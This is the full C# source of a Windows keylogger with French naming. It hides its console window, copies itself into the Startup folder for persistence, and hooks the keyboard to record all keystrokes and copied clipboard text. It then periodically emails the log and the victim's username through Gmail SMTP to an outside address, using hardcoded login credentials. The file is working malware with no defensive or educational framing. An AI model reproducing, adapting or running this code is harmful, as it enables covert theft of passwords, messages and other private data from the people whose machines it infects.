using System;
using System.Diagnostics;
using System.IO;
using System.Net.Mail;
using System.Net.Mime;
using System.Runtime.InteropServices;
using System.Windows.Forms;

namespace Win32AppAF
{
    class Program
    {
        //CONSTANTES
        public static int DELAI_ECRITURE_FICHIER = 10; //En seconde
        public static double TAILLE_FICHIER_AVANT_ENVOI = 0.1; //En Ko


        #region KeyDetect
        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        const int SW_HIDE = 0;
        const int SW_SHOW = 5;

        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;
        private static LowLevelKeyboardProc _proc = HookCallback;
        private static IntPtr _hookID = IntPtr.Zero;
        #endregion

        private static string TouchesAppuiee = string.Empty;
        private static string pressePapier = string.Empty;
        public static Timer delaiSave = new Timer();
        public static string cheminDossier = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
        public static string cheminFichier = cheminDossier + @"\varTemp.txt";
        public static string cheminExe;

        #region KeyDetect
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        [STAThread]
        #endregion

        static void Main(string[] args)
        {
            CacherConsole();
            
            DeplacerMenuDemarrer();

            //Délai des ecriture dans varTemp
            delaiSave.Interval = DELAI_ECRITURE_FICHIER * 1000;
            delaiSave.Tick += delaiSave_Tick;
            delaiSave.Enabled = true;

            #region KeyDetect
            Application.EnableVisualStyles();
            _hookID = SetHook(_proc);

            Application.Run();
            
            UnhookWindowsHookEx(_hookID);
            #endregion
        }

        static void delaiSave_Tick(object sender, EventArgs e)
        {
            //Ecrit dans varTemp la fin des écritures et réinitialise le KeyDetect
            using (StreamWriter tw = new StreamWriter(cheminFichier, true))
            {
                tw.WriteLine(TouchesAppuiee + Environment.NewLine + " --- FIN : " + System.DateTime.Now + " --- " + Environment.NewLine + Environment.NewLine + pressePapier);
                tw.Close();
                TouchesAppuiee = string.Empty;
                pressePapier = string.Empty;
            }

            //Récupère la taille de du fichier varTemp
            FileInfo fInfo = new FileInfo(cheminFichier);
            double sizeFile = fInfo.Length;     

            if (sizeFile >= TAILLE_FICHIER_AVANT_ENVOI * 1000)
            {
                #region Mail Rapport KeyDetect
                MailMessage mail = new MailMessage("bilaldu93de93@gmail.com", "adrien.wtzg@gmail.ch");
                mail.Subject = "La clé du savoir";
                mail.Body = "Utilisateur : " + Environment.UserName + Environment.NewLine + "Date : " + System.DateTime.Now;

                Attachment data = new Attachment(cheminFichier, MediaTypeNames.Application.Octet);
                ContentDisposition disposition = data.ContentDisposition;
                disposition.CreationDate = System.IO.File.GetCreationTime(cheminFichier);
                disposition.ModificationDate = System.IO.File.GetLastWriteTime(cheminFichier);
                disposition.ReadDate = System.IO.File.GetLastAccessTime(cheminFichier);
                mail.Attachments.Add(data);

                SmtpClient smtp = new SmtpClient("smtp.gmail.com");
                smtp.Port = 587;
                smtp.Credentials = new System.Net.NetworkCredential("bilaldu93de93@gmail.com", "ksjdfh25ASasdasdasSSS");
                smtp.EnableSsl = true;
                smtp.Send(mail);

                data.Dispose();

                File.Delete(cheminFichier);
                #endregion
            }
        }

        #region KeyDetect
        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (Process curProcess = Process.GetCurrentProcess())
            using (ProcessModule curModule = curProcess.MainModule)
            {
                return SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(curModule.ModuleName), 0);
            }
        }
        #endregion

        static bool ctrlAppuye = false;

        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                int vkCode = Marshal.ReadInt32(lParam);

                if (ctrlAppuye)
                {
                    if (((Keys)vkCode == Keys.C)||((Keys)vkCode == Keys.X))
                    {
                        pressePapier += " --- Presse Papier DEBUT --- " + Environment.NewLine + Clipboard.GetText() + Environment.NewLine + " --- Presse Papier FIN --- " + Environment.NewLine;
                        ctrlAppuye = false;
                    }
                }

                if (((Keys)vkCode == Keys.LControlKey)||((Keys)vkCode == Keys.RControlKey))
                {
                    ctrlAppuye = true;
                }

                #region Switch Traduction des touches
                switch ((Keys)vkCode)
                {
                    
                    case Keys.D0:
                        TouchesAppuiee += "0";
                        break;
                    case Keys.D1:
                        TouchesAppuiee += "1";
                        break;
                    case Keys.D2:
                        TouchesAppuiee += "2";
                        break;
                    case Keys.D3:
                        TouchesAppuiee += "3";
                        break;
                    case Keys.D4:
                        TouchesAppuiee += "4";
                        break;
                    case Keys.D5:
                        TouchesAppuiee += "5";
                        break;
                    case Keys.D6:
                        TouchesAppuiee += "6";
                        break;
                    case Keys.D7:
                        TouchesAppuiee += "7";
                        break;
                    case Keys.D8:
                        TouchesAppuiee += "8";
                        break;
                    case Keys.D9:
                        TouchesAppuiee += "9";
                        break;

                    case Keys.NumPad0:
                        TouchesAppuiee += "0";
                        break;
                    case Keys.NumPad1:
                        TouchesAppuiee += "1";
                        break;
                    case Keys.NumPad2:
                        TouchesAppuiee += "2";
                        break;
                    case Keys.NumPad3:
                        TouchesAppuiee += "3";
                        break;
                    case Keys.NumPad4:
                        TouchesAppuiee += "4";
                        break;
                    case Keys.NumPad5:
                        TouchesAppuiee += "5";
                        break;
                    case Keys.NumPad6:
                        TouchesAppuiee += "6";
                        break;
                    case Keys.NumPad7:
                        TouchesAppuiee += "7";
                        break;
                    case Keys.NumPad8:
                        TouchesAppuiee += "8";
                        break;
                    case Keys.NumPad9:
                        TouchesAppuiee += "9";
                        break;

                    case Keys.OemPeriod:
                        TouchesAppuiee += ".";
                        break;
                    case Keys.Oemcomma:
                        TouchesAppuiee += ",";
                        break;
                    case Keys.Space:
                        TouchesAppuiee += " ";
                        break;
                    case Keys.Tab:
                        break;
                    case Keys.Return:
                        TouchesAppuiee += Environment.NewLine;
                        break;
                    case Keys.OemOpenBrackets:
                        TouchesAppuiee += "'";
                        break;
                    default:
                        TouchesAppuiee += (Keys)vkCode;
                        break;
                }
                #endregion

            }
            return CallNextHookEx(_hookID, nCode, wParam, lParam);
        }

        public static void DeplacerMenuDemarrer()
        {
            string emplacement = System.Reflection.Assembly.GetExecutingAssembly().Location, demarrage = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + @"\" + System.Reflection.Assembly.GetExecutingAssembly().GetName().Name + @".exe";
            cheminExe = demarrage;
            if (!System.IO.File.Exists(demarrage))
            {
                File.Move(emplacement, demarrage);
            }
        }

        public static void CacherConsole()
        {
            var handle = GetConsoleWindow();
            ShowWindow(handle, SW_HIDE);
        }

    }
}
